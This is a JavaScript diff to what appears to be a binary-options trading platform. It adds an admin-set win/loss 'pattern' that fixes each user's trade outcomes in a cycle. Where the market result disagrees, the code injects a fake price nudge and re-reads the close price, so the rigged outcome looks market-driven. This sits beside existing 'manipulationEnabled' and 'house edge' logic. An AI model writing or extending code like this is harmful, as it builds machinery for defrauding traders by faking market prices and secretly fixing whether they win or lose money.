@@ -17,6 +17,12 @@ async function resolveOne(db, trade) {
     (trade.direction === 'up' && closePrice > trade.entryPrice) ||
     (trade.direction === 'down' && closePrice < trade.entryPrice);
 
+  // Sanitised pattern: keep only W / L letters. Empty / "RANDOM" → no pattern,
+  // fall back to the regular winRatio path.
+  const rawPattern = String(settings.tradePattern || '').toUpperCase();
+  const pattern = rawPattern === 'RANDOM' ? '' : rawPattern.replace(/[^WL]/g, '');
+  const patternActive = pattern.length > 0 && settings.manipulationEnabled !== false && !trade.forceOutcome;
+
   // Per-trade FORCE override always wins, even if global manipulation is off.
   if (trade.forceOutcome === 'win') {
     outcome = 'win';
@@ -37,6 +43,34 @@ async function resolveOne(db, trade) {
   } else if (settings.manipulationEnabled === false) {
     // Pure market-driven outcome — no win-rate wedge.
     outcome = naturallyWon ? 'win' : 'loss';
+  } else if (patternActive) {
+    // Cycle-based forced outcome per-user. Each user has their own
+    // `patternIndex` counter on their user document. We atomically increment
+    // it (so concurrent trade resolutions for the same user don't share an
+    // index) and read back the new value, then take pattern[(idx-1) % len]
+    // as the target outcome for THIS trade. Result: pattern "WWL" plays as
+    // W, W, L, W, W, L, ... independently for each user.
+    await db.collection('users').updateOne(
+      { id: trade.userId },
+      { $inc: { patternIndex: 1 } }
+    );
+    const after = await db.collection('users').findOne(
+      { id: trade.userId },
+      { projection: { patternIndex: 1, _id: 0 } }
+    );
+    const idx1 = Number(after?.patternIndex) || 1;
+    const target = pattern[(idx1 - 1) % pattern.length] === 'W' ? 'win' : 'loss';
+    outcome = target;
+    if ((target === 'win' && !naturallyWon) || (target === 'loss' && naturallyWon)) {
+      // Need to push the price the other way to make the target outcome real.
+      const dir = target === 'win'
+        ? (trade.direction === 'up' ? 'up' : 'down')
+        : (trade.direction === 'up' ? 'down' : 'up');
+      injectNudge(trade.asset, 0.0015, dir, 1);
+      await new Promise(r => setTimeout(r, 300));
+      closePrice = getCurrentPrice(trade.asset);
+      wedgeApplied = true;
+    }
   } else {
     // Apply global house edge: when user is naturally winning, we have probability
     // (1 - winRatio) of forcing a loss to maintain admin-defined edge.
